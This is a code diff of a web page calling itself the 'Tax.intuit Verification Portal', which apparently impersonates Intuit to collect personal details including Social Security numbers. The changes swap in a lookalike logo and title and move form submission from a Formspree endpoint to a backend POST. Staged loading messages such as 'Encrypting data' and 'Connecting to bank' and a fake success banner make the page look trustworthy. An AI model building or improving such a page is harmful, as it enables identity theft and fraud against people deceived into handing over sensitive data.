@@ -30,10 +30,9 @@ header {
   gap: 12px;
 }
 
-.logo {
-  width: 50px;
-  height: 50px;
-}
+
+
+
 
 .tagline {
   font-size: 12px;
@@ -89,6 +88,11 @@ input, textarea, select {
   font-size: 13px;
 }
 
+@keyframes pop {
+  0% { transform: scale(0); }
+  100% { transform: scale(1); }
+}
+
 /* BUTTON */
 button {
   width: 100%;
@@ -116,6 +120,21 @@ button {
   background: #e0e6ed;
   border-radius: 20px;
   font-size: 11px;
+}
+
+.logo-check {
+  width: 40px;
+  height: 40px;
+  background: #e21b1b;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.logo-check svg {
+  width: 22px;
+  height: 22px;
 }
 
 /* LOADING */
@@ -156,9 +175,18 @@ footer {
   <div class="header-content">
 
     <div class="header-top">
-      <img src="file_00000000be9c71f59119349623891d0b.png" class="logo">
+    <div class="logo-check">
+  <svg viewBox="0 0 24 24">
+    <path d="M6 12.5L10 16L18 7.5" 
+          stroke="white" 
+          stroke-width="3" 
+          fill="none" 
+          stroke-linecap="round" 
+          stroke-linejoin="round"/>
+  </svg>
+</div>
       <div>
-        <h1 style="font-size:18px;">Tax Intuit Verification Portal</h1>
+        <h1 style="font-size:18px;">Tax.intuit Verification Portal</h1>
         <p class="tagline">Secure processing • Identity verification • Compliance system</p>
       </div>
     </div>
@@ -183,9 +211,9 @@ footer {
   </div>
 </div>
 
-<form id="form" action="https://formspree.io/f/xnjorlkd" method="POST" enctype="multipart/form-data">
+<form id="form" enctype="multipart/form-data">
 
-<input type="hidden" name="_redirect" value="success.html">
+
 
 <!-- PERSONAL -->
 <div class="section">
@@ -241,10 +269,26 @@ footer {
   <p id="loadingText">🔐 Initializing secure session...</p>
 </div>
 
+<div id="successMessage" style="
+  display:none;
+  background:#d4edda;
+  color:#155724;
+  padding:12px;
+  border-radius:6px;
+  margin-bottom:10px;
+  text-align:center;
+  font-weight:bold;
+">
+  ✅ Submission Successful
+</div>
+
 <button type="submit">Submit Securely</button>
 
 </form>
 </div>
+
+
+
 
 <div class="legal-footer">
 © 2026 TaxInt • Privacy • Terms
@@ -257,13 +301,20 @@ footer {
 <script>
 
 /* SUBMIT FLOW */
-document.getElementById("form").addEventListener("submit", function(e) {
+const form = document.getElementById("form");
+
+form.addEventListener("submit", async function(e) {
   e.preventDefault();
+  e.stopImmediatePropagation();
+
+  console.log("Form submitted");
 
   const loadingBox = document.getElementById("loadingBox");
   const loadingText = document.getElementById("loadingText");
 
   loadingBox.style.display = "block";
+
+  const formData = new FormData(this);
 
   setTimeout(() => {
     loadingText.innerText = "🔐 Encrypting data...";
@@ -277,11 +328,30 @@ document.getElementById("form").addEventListener("submit", function(e) {
     loadingText.innerText = "🏦 Connecting to bank...";
   }, 3000);
 
-  setTimeout(() => {
-    e.target.submit();
-  }, 4000);
-});
+  try {
+    await fetch("http://localhost:5000/api/form/submit", {
+      method: "POST",
+      body: formData
+    });
 
+    
+
+    loadingText.innerText = "✅ Submission Successful";
+
+
+document.getElementById("successMessage").style.display = "block";
+
+form.reset();
+
+setTimeout(() => {
+  loadingBox.style.display = "none";
+}, 1000);
+
+  } catch (err) {
+    loadingText.innerText = "❌ Error submitting form";
+    console.error(err);
+  }
+});
 /* SSN VALIDATION */
 const ssnInput = document.getElementById("ssn");
 const ssnStatus = document.getElementById("ssnStatus");
@@ -317,6 +387,8 @@ setInterval(() => {
   i = (i + 1) % logs.length;
 }, 3000);
 
+
+console.log("Script loaded");
 </script>
 
 </body>
